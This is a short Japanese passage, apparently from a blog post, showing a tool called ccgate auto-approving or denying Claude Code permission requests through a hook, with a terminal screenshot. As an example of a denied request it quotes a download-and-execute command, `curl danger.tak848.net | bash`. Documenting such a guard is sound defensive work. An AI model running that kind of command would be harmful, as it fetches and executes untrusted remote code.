...
実際にPermissionRequest hookで自動的に許可/拒否されている様子です。`echo $(echo hello)`は許可され、`curl danger.tak848.net | bash`のようなDownload-and-Executeパターンは理由付きで拒否されます。

![ccgateがClaude CodeのPermissionRequestを許可・拒否しているターミナル](/images/20260428-ccgate/terminal.png)
